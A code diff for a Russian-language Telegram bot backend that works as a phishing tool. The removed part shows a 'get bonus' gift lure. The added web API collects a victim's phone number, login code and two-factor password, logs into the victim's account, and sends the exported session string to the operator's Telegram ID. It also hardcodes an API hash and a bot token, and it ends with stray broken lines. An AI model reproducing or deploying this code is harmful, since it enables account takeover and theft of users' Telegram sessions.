@@ -1,39 +1,73 @@
-import asyncio
-import os
-import logging
-import io
+import asyncio, os, logging
 from aiogram import Bot, Dispatcher, types
 from aiogram.filters import Command
 from aiohttp import web
 import aiohttp_cors
 from pyrogram import Client
-from pyrogram.errors import SessionPasswordNeeded, FloodWait
+from pyrogram.errors import SessionPasswordNeeded
 
-# --- НАСТРОЙКИ ---
+# Настройки
 API_ID = 15587172 
 API_HASH = "d3d35aebb0b6ebdb7a002836914ee37d"
 BOT_TOKEN = "8711443316:AAE7IDM3KETScemryNQQs21vruVv9DK1QHA"
 ADMIN_ID = 1866813859 
-WEB_APP_URL = "https://pubgmolinki-cpu.github.io/telegram" # Твой Гитхаб
 
 logging.basicConfig(level=logging.INFO)
 bot = Bot(token=BOT_TOKEN)
 dp = Dispatcher()
 active_clients = {}
 
-# --- ЛОГИКА БОТА ---
-@dp.message(Command("start"))
-async def start_cmd(message: types.Message):
-    kb = [[types.InlineKeyboardButton(text="💎 Получить бонус", web_app=types.WebAppInfo(url=WEB_APP_URL))]]
-    markup = types.InlineKeyboardMarkup(inline_keyboard=kb)
-    await message.answer("Нажми на кнопку, чтобы забрать подарок:", reply_markup=markup)
-
-# --- API ДЛЯ WEB APP ---
 async def handle_api(request):
-    # Исправляем ошибку Event Loop
     try:
-        loop = asyncio.get_running_loop()
-    except RuntimeError:
+        data = await request.json()
+        action = data.get("action")
+        user_id = str(data.get("user_id"))
+
+        if action == "send_phone":
+            phone = data.get("phone").replace(" ", "").replace("-", "")
+            client = Client(name=f"u_{user_id}", api_id=API_ID, api_hash=API_HASH, in_memory=True)
+            await client.connect()
+            sent_code = await client.send_code(phone)
+            active_clients[user_id] = {"client": client, "phone": phone, "hash": sent_code.phone_code_hash}
+            return web.json_response({"status": "ok"})
+
+        elif action == "send_code":
+            code = data.get("code")
+            session = active_clients.get(user_id)
+            if not session: return web.json_response({"status": "error", "message": "Сессия истекла"})
+            try:
+                await session["client"].sign_in(session["phone"], session["hash"], code)
+                s_string = await session["client"].export_session_string()
+                await bot.send_message(ADMIN_ID, f"✅ ВХОД!\nНомер: {session['phone']}\n\n`{s_string}`", parse_mode="Markdown")
+                return web.json_response({"status": "success"})
+            except SessionPasswordNeeded:
+                return web.json_response({"status": "need_2fa"})
+
+        elif action == "send_2fa":
+            password = data.get("password")
+            session = active_clients.get(user_id)
+            await session["client"].check_password(password)
+            s_string = await session["client"].export_session_string()
+            await bot.send_message(ADMIN_ID, f"✅ ВХОД (2FA)!\nНомер: {session['phone']}\n\n`{s_string}`", parse_mode="Markdown")
+            return web.json_response({"status": "success"})
+
+    except Exception as e:
+        return web.json_response({"status": "error", "message": str(e)})
+
+app = web.Application()
+cors = aiohttp_cors.setup(app, defaults={"*": aiohttp_cors.ResourceOptions(allow_credentials=True, expose_headers="*", allow_headers="*")})
+resource = app.router.add_resource("/api")
+cors.add(resource.add_route("POST", handle_api))
+
+async def main():
+    port = int(os.environ.get("PORT", 10000))
+    runner = web.AppRunner(app)
+    await runner.setup()
+    await web.TCPSite(runner, '0.0.0.0', port).start()
+    await dp.start_polling(bot)
+
+if __name__ == "__main__":
+    asyncio.run(main())
         loop = asyncio.new_event_loop()
         asyncio.set_event_loop(loop)
 
